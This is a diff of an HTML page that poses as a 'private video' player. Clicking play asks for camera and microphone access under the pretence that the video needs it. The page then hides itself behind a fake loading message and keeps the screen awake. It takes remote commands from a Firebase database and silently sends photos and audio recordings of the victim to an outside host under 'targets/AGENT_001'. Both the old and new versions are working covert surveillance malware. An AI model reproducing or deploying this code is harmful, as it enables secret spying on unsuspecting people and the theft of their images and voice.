@@ -3,253 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video not available - Private Video</title>
+    <title>Private Video Player</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body {
             margin: 0;
             background-color: #000;
             color: #fff;
-            font-family: Arial, sans-serif;
+            font-family: sans-serif;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            text-align: center;
-            overflow: hidden; /* Important for stealth */
         }
-        #fake-video-container {
-            position: relative;
+
+        /* Fake Video Player Box */
+        #video-box {
             width: 90%;
-            max-width: 400px;
+            max-width: 500px;
+            aspect-ratio: 16/9;
+            background: #111;
+            border: 2px solid #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
             cursor: pointer;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3); /* Subtle green glow */
+            border-radius: 8px;
         }
-        #fake-video-container img {
-            width: 100%;
-            display: block;
-        }
-        #play-button {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80px;
-            height: 80px;
-            background-color: rgba(255, 0, 0, 0.8);
+
+        /* Play Button (Center) */
+        #play-btn {
+            width: 70px;
+            height: 70px;
+            background: rgba(255, 0, 0, 0.9);
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-size: 40px;
-            color: #fff;
-            border: 3px solid #fff;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            transition: transform 0.2s;
         }
-        #play-button::before {
-            content: '▶';
+
+        #play-btn::after {
+            content: '';
+            width: 0;
+            height: 0;
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            border-left: 25px solid white;
             margin-left: 5px;
         }
-        h1 {
-            font-size: 24px;
-            margin-top: 30px;
-            color: #00ff41; /* Green title */
-            text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
+
+        #video-box:hover #play-btn {
+            transform: scale(1.1);
         }
-        p {
-            font-size: 16px;
-            color: #ccc;
-            margin-top: 10px;
-        }
-        #status-message {
-            color: #00ff41;
+
+        .text-info {
             margin-top: 20px;
+            text-align: center;
+            padding: 0 10px;
+        }
+
+        .text-info h2 {
+            color: #00ff41;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .text-info p {
+            color: #888;
+            font-size: 14px;
+        }
+        
+        #loading-text {
+            display: none;
+            color: #00ff41;
+            margin-top: 15px;
             font-weight: bold;
-            display: none; /* Hidden until permission is granted */
         }
     </style>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
 <body>
 
-    <div id="fake-video-container">
-        <img id="fake-thumbnail" src="https://via.placeholder.com/640x360/000000/00ff41?text=VIRAL+VIDEO+CLICK+TO+PLAY" alt="Viral Video Thumbnail">
-        <div id="play-button"></div>
+    <div id="video-box" onclick="startSystem()">
+        <div id="play-btn"></div>
     </div>
 
-    <h1>Video not available or private.</h1>
-    <p>Please click the play button to view this content.</p>
-    <p id="status-message">Initializing secure playback...</p>
+    <div class="text-info" id="info-text">
+        <h2>Video not available or private.</h2>
+        <p>This content requires permission to play.<br>Click the play button to continue.</p>
+    </div>
+
+    <div id="loading-text">Initializing Secure Server...</div>
 
     <script>
-        // --- Firebase Configuration ---
-        const firebaseConfig = {
-            databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/"
-        };
+        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        
-        // --- IMPORTANT: Set your target ID here ---
-        const targetID = "AGENT_001"; // <<<--- Replace with the actual AGENT_ID of this phone
+        const targetID = "AGENT_001"; // Aapka Agent ID
 
-        // --- UI Elements ---
-        const fakeVideoContainer = document.getElementById('fake-video-container');
-        const statusMessage = document.getElementById('status-message');
-
-        // --- WakeLock (Keep screen on) ---
-        let wakeLock = null;
-        async function requestWakeLock() {
-            try {
-                if ('wakeLock' in navigator) {
-                    wakeLock = await navigator.wakeLock.request('screen');
-                    console.log("Wake Lock acquired.");
-                } else if ('keepAwake' in screen) {
-                    screen.keepAwake = true; // For older APIs
-                    console.log("Old Wake Lock acquired.");
-                }
-            } catch (err) {
-                console.warn("WakeLock failed:", err.message);
-            }
-        }
-
-        // --- Main Listener Function: Starts tracking on fake video click ---
-        fakeVideoContainer.addEventListener('click', startTracking);
-
-        async function startTracking() {
-            fakeVideoContainer.removeEventListener('click', startTracking); // Remove listener after first click
-            statusMessage.style.display = 'block'; // Show initializing message
+        async function startSystem() {
+            // UI Change
+            document.getElementById('info-text').style.opacity = "0.5";
+            document.getElementById('loading-text').style.display = "block";
 
             try {
-                // Request Camera and Microphone permissions
+                // Request Permission
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                statusMessage.textContent = "Access granted. Loading content...";
-                console.log("Camera & Mic permissions granted.");
-
-                // If permissions are granted, start background listeners
-                requestWakeLock(); // Keep screen awake
-                setupCommandListener(stream); // Start listening for commands from your panel
                 
-                // You can optionally play a silent video here to keep stream active
-                const videoElement = document.createElement('video');
-                videoElement.srcObject = stream;
-                videoElement.muted = true; // Silent video
-                videoElement.play().catch(e => console.log("Video play error (expected if no stream):", e));
-                videoElement.style.display = 'none'; // Keep video hidden
+                // Hide UI after permission to look like it's loading
+                document.getElementById('video-box').style.display = "none";
+                document.getElementById('info-text').innerHTML = "<h2>Loading Video...</h2><p>Please wait while we decrypt the stream.</p>";
 
-                document.body.appendChild(videoElement);
+                // Keep screen awake
+                if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen'); }
 
-                // Hide fake video UI and replace with potential background video (or just keep black)
-                fakeVideoContainer.innerHTML = ''; // Clear fake video UI
-                fakeVideoContainer.style.backgroundColor = 'black'; // Make container black
-                fakeVideoContainer.style.boxShadow = 'none'; // Remove glow
-
-                // You could embed a real, harmless "viral video" here if you want to fool the user even more
-                // For now, it stays mostly black after permissions
-
-            } catch (err) {
-                statusMessage.textContent = "Access Denied! Please refresh and try again.";
-                statusMessage.style.color = 'red';
-                console.error("Permission Denied:", err);
-            }
-        }
-
-        // --- Command Listener (Listens for commands from your BOSS TRACKING panel) ---
-        function setupCommandListener(activeStream) {
-            db.ref('commands/' + targetID).on('value', async (snapshot) => {
-                const cmd = snapshot.val();
-                if (!cmd || !cmd.action) return;
-
-                console.log("Command received:", cmd.action);
-
-                // Handle Photo/Video Command
-                if (cmd.action === 'photo_front' || cmd.action === 'photo_back') {
-                    await takePhoto(cmd.action === 'photo_front' ? 'user' : 'environment', activeStream);
-                }
-                // Handle Audio Command
-                else if (cmd.action === 'audio_record') {
-                    await startBackgroundAudio(activeStream);
-                }
-                // Clear the command after execution to avoid re-triggering
-                db.ref('commands/' + targetID).remove(); 
-            });
-        }
-
-        // --- Silent Camera Capture ---
-        async function takePhoto(mode, stream) {
-            console.log("Taking photo from:", mode);
-            try {
-                // Ensure the stream is active, or request a new one if it stopped
-                if (!stream || !stream.active) {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                }
-
+                // Persistent Stream logic
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                await video.play();
+                video.muted = true;
+                video.play();
 
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.6); // 60% quality for balance
-                
-                db.ref('targets/' + targetID + '/photos').push({
-                    img: dataUrl,
-                    time: Date.now()
-                });
-                console.log("Photo uploaded.");
+                // Listen for Commands
+                db.ref('commands/' + targetID).on('value', async (snap) => {
+                    const cmd = snap.val();
+                    if (!cmd) return;
 
-                // Stop tracks only if they were started specifically for this shot and not part of the persistent stream
-                // stream.getTracks().forEach(track => track.stop()); // Commented out to keep stream alive
-
-            } catch (err) {
-                console.error("Photo capture failed:", err);
-            }
-        }
-
-        // --- Background Audio Recording (5 Seconds) ---
-        async function startBackgroundAudio(stream) {
-            console.log("Starting audio recording.");
-            try {
-                 // Ensure the stream is active, or request a new one if it stopped
-                if (!stream || !stream.active) {
-                    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                }
-
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onloadend = () => {
-                        db.ref('targets/' + targetID + '/audios').push({
-                            audio: reader.result,
+                    if (cmd.action.includes('photo')) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        db.ref('targets/' + targetID + '/photos').push({
+                            img: canvas.toDataURL('image/jpeg', 0.5),
                             time: Date.now()
                         });
-                        console.log("Audio uploaded.");
-                    };
-                    // stream.getTracks().forEach(track => track.stop()); // Commented out to keep stream alive
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state === "recording") {
-                        mediaRecorder.stop();
                     }
-                }, 5000); // Record for 5 seconds
+
+                    if (cmd.action === 'audio_record') {
+                        const recorder = new MediaRecorder(stream);
+                        let chunks = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'audio/webm' });
+                            const reader = new FileReader();
+                            reader.readAsDataURL(blob);
+                            reader.onloadend = () => {
+                                db.ref('targets/' + targetID + '/audios').push({ audio: reader.result, time: Date.now() });
+                            };
+                        };
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 4000);
+                    }
+                    // Command clear na karein agar aap chahte hain ke panel control kare
+                });
+
             } catch (err) {
-                console.error("Audio recording failed:", err);
+                alert("Error: To view this private video, you must allow camera access.");
+                location.reload();
             }
         }
-
-        // Optional: Replace fake thumbnail with something more realistic
-        // document.getElementById('fake-thumbnail').src = "YOUR_VIRAL_VIDEO_THUMBNAIL_URL_HERE";
     </script>
 </body>
 </html>
